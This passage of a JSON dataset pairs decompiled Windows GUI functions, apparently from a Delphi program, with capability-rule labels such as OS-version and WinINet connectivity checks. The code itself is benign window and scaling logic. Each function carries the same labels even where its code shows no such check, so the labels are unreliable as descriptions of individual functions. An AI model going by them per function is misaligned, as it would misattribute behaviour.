            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ba34(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    if ((*(*(in_EAX + 4) + 0x1c) & 2) == 0) {\n        iVar1 = *(in_EAX + 0x14);\n        if ((param_2 <= iVar1) && (iVar1 = param_2,  param_2 < 0)) {\n            iVar1 = 0;\n        }\n        bVar3 = *(in_EAX + 0x18) != '\\0';\n        if (iVar1 != *(in_EAX + 0xc)) {\n            *(in_EAX + 0xc) = iVar1;\n            if (*(in_EAX + 0x18) == '\\0') {\n                fcn.004575d4();\n            }\n            else {\n                fcn.004575d4();\n            }\n            if ((((*(*(in_EAX + 4) + 0x1c) & 0x10) != 0) && (iVar1 = fcn.0043b1a8(),  iVar1 != 0)) &&\n               (*(iVar1 + 0x298) != 0)) {\n                (**(**(iVar1 + 0x298) + 0xc))();\n            }\n        }\n        uVar2 = fcn.00457a28(bVar3);\n        iVar1 = (***0x4929c4)(uVar2);\n        if (iVar1 != *(in_EAX + 0xc)) {\n            uVar2 = fcn.00457a28(bVar3, *(in_EAX + 0xc), 0xffffffff);\n            (***0x492704)(uVar2);\n        }\n    }\n    else {\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 428
    },
    "0043bbb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043bbb4(int32_t arg_8h)\n\n{\n    char in_AL;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t arg_14h;\n    \n    piVar3 = arg_8h + -4;\n    arg_14h = -(in_AL != '\\0');\n    uVar4 = *(*(*piVar3 + 0x34) * 4 + 0x491544);\n    uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x49151c);\n    uVar1 = fcn.00457a28();\n    fcn.004310b0(uVar1, uVar2, uVar4, arg_14h);\n    if (0 < *(*piVar3 + 0x24)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x24);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x491520);\n        uVar1 = fcn.00457a28();\n        fcn.004310b0(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x38)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x38);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x491524);\n        uVar1 = fcn.00457a28();\n        fcn.004310b0(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x30)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x30);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x491528);\n        uVar1 = fcn.00457a28();\n        fcn.004310b0(uVar1, uVar2, uVar4, uVar5);\n    }\n    uVar5 = 0;\n    uVar2 = fcn.00423aa4();\n    uVar4 = *(*(*piVar3 + 0x18) * 0x14 + 0x49152c);\n    uVar1 = fcn.00457a28();\n    fcn.004310b0(uVar1, uVar4, uVar2, uVar5);\n    return;\n}\n",
        "token_count": 596
    },
    "0043bcbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043bcbc(uint param_1, uchar param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    int32_t var_12h;\n    uint var_eh;\n    uint var_ah;\n    int32_t var_6h;\n    \n    *(in_EAX + 0x14) = 0;\n    cVar1 = *(in_EAX + 0x18);\n    var_6h._1_1_ = param_2;\n    unique0x100000a4 = in_EAX;\n    if (*(in_EAX + 0x1c) != '\\0') {\n        iVar2 = fcn.0043b5c4();\n        iVar2 = *(stack0xfffffff8 + 0x10) - iVar2;\n        *(stack0xfffffff8 + 0x14) = iVar2;\n        if (iVar2 < 0) {\n            *(stack0xfffffff8 + 0x14) = 0;\n        }\n    }\n    var_22h = 0x1c;\n    var_1eh = 0x17;\n    var_1ah = 0;\n    if (*(stack0xfffffff8 + 0x14) < 1) {\n        var_16h = 0;\n    }\n    else {\n        var_16h = *(stack0xfffffff8 + 0x10);\n    }\n    var_12h = fcn.0043b5c4();\n    var_12h = var_12h + 1;\n    var_eh = *(stack0xfffffff8 + 0xc);\n    var_ah = var_eh;\n    fcn.0043bbb4(&stack0xfffffffc);\n    *(stack0xfffffff8 + 0x44) = 0;\n    uVar3 = fcn.00457a28(cVar1 == '\\x01', &var_22h, 0xffffffff);\n    (***0x492ac0)(uVar3);\n    fcn.0043ba34();\n    iVar2 = fcn.0043b5c4();\n    uVar4 = (iVar2 * 9) / 10;\n    *(stack0xfffffff8 + 10) = uVar4;\n    if (*(stack0xfffffff8 + 0x1f) != '\\0') {\n        *(stack0xfffffff8 + 8) = (uVar4 & 0xffff) / 10;\n    }\n    return;\n}\n",
        "token_count": 604
    },
    "0043be9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043be9c(void)\n\n{\n    char cVar1;\n    uint arg_8h;\n    \n    fcn.00453d64();\n    if (*(*0x492b04 + 0xd) == '\\0') {\n        cVar1 = fcn.0040e2f8();\n        if (cVar1 == '\\0') {\n            arg_8h = fcn.00457a28();\n            fcn.004310e4(arg_8h);\n        }\n    }\n    fcn.0043c0b4();\n    return;\n}\n",
        "token_count": 127
    },
    "0043bf1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043bf1c(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00404610();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar4 = fcn.0044f640();\n    iVar5 = *(in_EAX + 0x250);\n    cVar2 = fcn.0043b4dc();\n    if ((cVar2 == '\\0') || (*(iVar5 + 0x10) <= iVar4)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        fcn.0043ba34();\n    }\n    iVar5 = fcn.00453b18();\n    if (-1 < iVar5 + -1) {\n        do {\n            fcn.00453adc();\n            fcn.00453adc();\n            fcn.00419680();\n            fcn.0044f354();\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    iVar5 = *(iVar3 + 8);\n    if (-1 < iVar5 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.004197d8();\n            fcn.00450f7c(arg_8h);\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    if (bVar1) {\n        fcn.0043b31c();\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 435
    },
    "0043c034": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043c034(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x25c) < 1) {\n        fcn.0043b430();\n        fcn.0043b430();\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "0043c0b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043c0b4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x260) == '\\0') {\n        puStack12 = 0x43c0d3;\n        var_4h = in_EAX;\n        cVar1 = fcn.00457d34();\n        if (cVar1 != '\\0') {\n            uStack16 = 0x43c19f;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            *(var_4h + 0x260) = 1;\n            puStack12 = &stack0xfffffffc;\n            cVar1 = fcn.0043b644();\n            if (cVar1 == '\\0') {\n                cVar1 = fcn.0043b644();\n                if (cVar1 == '\\0') {\n                    fcn.0043bcbc();\n                    fcn.0043bcbc();\n                }\n                else {\n                    fcn.0043bcbc();\n                    fcn.0043bcbc();\n                }\n            }\n            else {\n                fcn.0043bcbc();\n                fcn.0043bcbc();\n            }\n            *in_FS_OFFSET = uStack20;\n            *(var_4h + 0x260) = 0;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 344
    },
    "0043c7f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0043c7f0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00402ed8();\n    *(in_EAX + 0x2a4) = uVar1;\n    fcn.0043bdd8();\n    *(in_EAX + 0x50) = *0x43c9b4;\n    fcn.004429c8();\n    fcn.00442a04();\n    fcn.0044f3bc();\n    fcn.0044f3f0();\n    piVar2 = fcn.0042a674();\n    *(in_EAX + 0x288) = piVar2;\n    (***0x492750)(0x31);\n    (**(*piVar2 + 0x40))();\n    (***0x492750)();\n    (**(**(in_EAX + 0x288) + 0x34))();\n    iVar3 = *(in_EAX + 0x288);\n    *(iVar3 + 0x14) = in_EAX;\n    *(iVar3 + 0x10) = fcn.0043d4a0;\n    *(in_EAX + 0x278) = 2;\n    uVar1 = fcn.0042497c();\n    *(in_EAX + 0x280) = uVar1;\n    fcn.0044e570();\n    *(in_EAX + 0x270) = *0x43c9b8;\n    *(in_EAX + 0x271) = 2;\n    *(in_EAX + 0x273) = 0;\n    *(in_EAX + 0x279) = 3;\n    *(in_EAX + 0x28c) = 0;\n    **(in_EAX + 0x2a4) = *(*0x497c18 + 0x40);\n    uVar1 = fcn.00447498();\n    *(*(in_EAX + 0x2a4) + 4) = uVar1;\n    iVar3 = fcn.0044726c();\n    *(iVar3 + 0x24) = in_EAX;\n    *(iVar3 + 0x20) = fcn.00447320;\n    *(*(in_EAX + 0x2a4) + 8) = 0;\n    *(in_EAX + 0x27d) = 1;\n    uVar1 = fcn.00404518();\n    *(in_EAX + 0xac) = uVar1;\n    *(in_EAX + 0x329) = 0xff;\n    *(in_EAX + 0x354) = 0;\n    fcn.0043d824();\n    fcn.0044fe8c();\n    fcn.0044fdf0();\n    fcn.00457c14();\n    fcn.0044328c();\n    *(in_EAX + 0x34c) = 10;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = 0x32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 798
    },
    "0043ca24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0043ca24(void)\n\n{\n    char cVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    int32_t *var_5h;\n    \n    puStack16 = 0x43ca2f;\n    *NULL = fcn.00404a0c();\n    puStack16 = 0x43ca42;\n    var_5h._0_1_ = extraout_DL;\n    fcn.00444858();\n    if ((*(stack0xfffffff8 + 7) & 8) == 0) {\n        puStack16 = 0x43ca57;\n        (**(***0x492ac4 + 0x14))();\n    }\n    uStack20 = 0x43cb24;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(stack0xfffffff8 + 0x9f) != '\\0') {\n        puStack16 = &stack0xfffffffc;\n        (**(*stack0xfffffff8 + 0xe8))();\n    }\n    fcn.004403e8();\n    cVar1 = fcn.00457d34();\n    if (cVar1 != '\\0') {\n        (**(*stack0xfffffff8 + 0xb4))();\n    }\n    fcn.004432c4();\n    fcn.00404640();\n    fcn.00404640();\n    fcn.0040f8b8();\n    fcn.0040f8b8();\n    fcn.0044726c();\n    fcn.00404640();\n    fcn.00402f0c();\n    fcn.0043be50();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x43cb2b;\n    uStack20 = 0x43cb23;\n    (**(***0x492ac4 + 0x18))();\n    return;\n}\n",
        "token_count": 466
    },
    "0043cb40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043cb40(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x31a) != 0) {\n        uStack28 = 0x43cb81;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        (**(in_EAX + 0x318))();\n        *in_FS_OFFSET = uStack32;\n    }\n    if ((*(in_EAX + 0x358) & 2) != 0) {\n        puStack24 = 0x43cbb6;\n        fcn.0043d824();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0043cbbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043cbbc(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x322) != 0) {\n        uStack28 = 0x43cbfd;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        (**(in_EAX + 800))();\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "0043cc1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043cc1c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.004523e8();\n    if ((*(in_EAX + 0x268) != 0) && ((*(in_EAX + 0x30) == 0 || ((*(in_EAX + 0x1c) & 0x10) == 0)))) {\n        *(in_EAX + 0x268) = 0;\n        cVar1 = fcn.0040483c();\n        if (cVar1 != '\\0') {\n            fcn.0043fee8();\n        }\n    }\n    fcn.0044726c();\n    cVar1 = fcn.00447558();\n    if (cVar1 != '\\0') {\n        fcn.00447320();\n    }\n    return;\n}\n",
        "token_count": 191
    },
    "0043cdbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043cdbc(void)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x43cdcf;\n    fcn.00453634();\n    uStack24 = 0x43d039;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    *(in_EAX + 0x2b0) = 0;\n    *(in_EAX + 0x2b4) = 0;\n    *(in_EAX + 0x2b8) = 0;\n    bVar1 = false;\n    puStack20 = &stack0xfffffffc;\n    iVar2 = fcn.004045cc();\n    if (iVar2 == *0x439700) {\n        *(in_EAX + 0x27c) = *0x4957f5 ^ 1;\n    }\n    fcn.00452c5c();\n    if ((**(in_EAX + 0x2a4) != 0) && (0 < *(in_EAX + 0x2b8))) {\n        if (((*(in_EAX + 0x8c) & 0x10) != 0) && (**(in_EAX + 0x2a4) != *(*0x497c18 + 0x40))) {\n            uVar3 = fcn.00424210(*(*0x497c18 + 0x40), **(in_EAX + 0x2a4));\n            sub.kernel32.dll_MulDiv(uVar3);\n            fcn.00424218();\n        }\n        **(in_EAX + 0x2a4) = *(*0x497c18 + 0x40);\n        iVar2 = fcn.0043d3f0();\n        if (iVar2 != *(in_EAX + 0x2b8)) {\n            bVar1 = true;\n            fcn.0043c318();\n            fcn.0044f780();\n            fcn.004574e0();\n            if ((*(in_EAX + 0x8c) & 4) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x2b0), iVar2, *(in_EAX + 0x2b8));\n                *(in_EAX + 0x2b0) = uVar3;\n            }\n            if ((*(in_EAX + 0x8c) & 8) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x2b4) = uVar3;\n            }\n            if ((*(in_EAX + 0x8c) & 0x20) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x242), iVar2, *(in_EAX + 0x2b8));\n                *(in_EAX + 0x242) = uVar3;\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x246) = uVar3;\n            }\n        }\n    }\n    if (0 < *(in_EAX + 0x2b0)) {\n        fcn.0044f658();\n    }\n    if (0 < *(in_EAX + 0x2b4)) {\n        fcn.0044f69c();\n    }\n    *(in_EAX + 0x8c) = *0x43d048;\n    if (!bVar1) {\n        fcn.0043c318();\n        fcn.004574e0();\n    }\n    uVar3 = 0;\n    fcn.00450f7c(0);\n    *in_FS_OFFSET = uVar3;\n    fcn.0045363c(0x43d040);\n    return;\n}\n",
        "token_count": 905
    },
    "0043d04c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043d04c(uint arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    // switch table (6 cases) at 0x43d062\n    switch(in_EAX & 0x7f) {\n    case 0:\n        uVar1 = fcn.0044726c();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0xc) != 0;\n    case 1:\n        uVar1 = fcn.0044726c();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x10) != 0;\n    case 2:\n        uVar1 = fcn.0044726c();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x14) != 0;\n    case 3:\n        uVar1 = fcn.0044726c();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x18) != 0;\n    case 4:\n        iVar2 = fcn.0044726c();\n        return *(iVar2 + 8);\n    case 5:\n        iVar2 = fcn.0044726c();\n        return *(iVar2 + 0x28);\n    default:\n        return 0;\n    }\n}\n",
        "token_count": 310
    },
    "0043d3b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043d3b4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        return *(in_EAX + 0x18) >> 0x10;\n    }\n    return *(in_EAX + 0x40);\n}\n",
        "token_count": 98
    },
    "0043d3d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043d3d4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        return *(in_EAX + 0x18);\n    }\n    return *(in_EAX + 0x44);\n}\n",
        "token_count": 92
    },
    "0043d4a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043d4a0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (**0x4927f4 == '\\0') {\n        fcn.00457a28();\n        iVar3 = fcn.0043ab74();\n        if (iVar3 != 0) {\n            (**(*in_EAX + 0x80))();\n        }\n    }\n    else {\n        cVar1 = fcn.00457d34();\n        if ((cVar1 != '\\0') && (*(in_EAX + 0x271) != '\\x03')) {\n            uVar2 = fcn.0044055c();\n            uVar2 = fcn.00457a28(0x80, 1, uVar2);\n            sub.user32.dll_SendMessageA(uVar2);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "0043d50c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043d50c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 600) == '\\0') && (*(*(in_EAX + 0x250) + 0x10) == 0)) && (*(*(in_EAX + 0x254) + 0x10) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 95
    },
    "0043d868": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043d868(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x43d94e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x277) == '\\x01') && (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x57) != '\\0')) &&\n       (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x30) == 0)) {\n        fcn.004075f4();\n        fcn.0040da70();\n        fcn.00404eb4();\n        puVar1 = puStack16;\n    }\n    puStack16 = puVar1;\n    if ((in_EAX == *(*0x497c14 + 0x44)) && ((*(in_EAX + 0x1c) & 8) == 0)) {\n        if (*(in_EAX + 0x57) == '\\0') {\n            fcn.0044764c();\n            fcn.0043abf0();\n            uVar3 = fcn.0044764c();\n            fcn.00457a28(uVar3);\n            fcn.0043abf0();\n        }\n        else {\n            uVar2 = fcn.0044764c();\n            fcn.00457a28(uVar2 ^ 1);\n            fcn.0043abf0();\n            fcn.0043abf0();\n        }\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x43d955;\n    uStack20 = 0x43d94d;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 471
    },
    "0043d960": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d960(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if ((param_2 != in_EAX[0xc]) && (param_2 != in_EAX)) {\n        bVar1 = in_EAX[0xc] == NULL;\n        if (bVar1) {\n            puStack20 = 0x43d999;\n            fcn.00458dc8();\n        }\n        uStack24 = 0x43da10;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (bVar1) {\n            puStack20 = &stack0xfffffffc;\n            (**(*in_EAX + 0xb0))();\n        }\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            in_EAX[0x9a] = 0;\n        }\n        in_EAX[0x9b] = 0;\n        fcn.00458e90();\n        if (in_EAX[0xc] == 0) {\n            fcn.004545e8();\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x43da17;\n        if (bVar1) {\n            uStack24 = 0x43da0f;\n            fcn.00458dc8();\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 375
    },
    "0043da1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043da1c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0041fcc0(arg_8h);\n    if (*(in_EAX + 0x298) != 0) {\n        (**(**(in_EAX + 0x298) + 0x30))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0043da5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043da5c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar6 = *param_2;\n    if (iVar6 < 0x113) {\n        if (iVar6 == 0x112) {\n            if ((((param_2[1] & 0xfff0U) == 0xf120) && (*(*0x497c14 + 0x44) == in_EAX)) &&\n               (cVar1 = fcn.0044764c(),  cVar1 != '\\0')) {\n                fcn.00447654();\n            }\n            goto code_r0x0043df88;\n        }\n        if (iVar6 - 6U < 3) {\n            if (*0x4914ec == '\\0') {\n                return;\n            }\n            if ((*param_2 == 7) && ((*(in_EAX + 7) & 0x10) == 0)) {\n                iVar6 = 0;\n                if (*(in_EAX + 0x277) == '\\x02') {\n                    iVar2 = fcn.0043e90c();\n                    if (iVar2 != 0) {\n                        fcn.0043e90c();\n                        iVar6 = fcn.00457a28();\n                    }\n                }\n                else if ((in_EAX[0x9a] != NULL) && (in_EAX[0x9a] != in_EAX)) {\n                    iVar6 = fcn.00457a28();\n                }\n                if (iVar6 != 0) {\n                    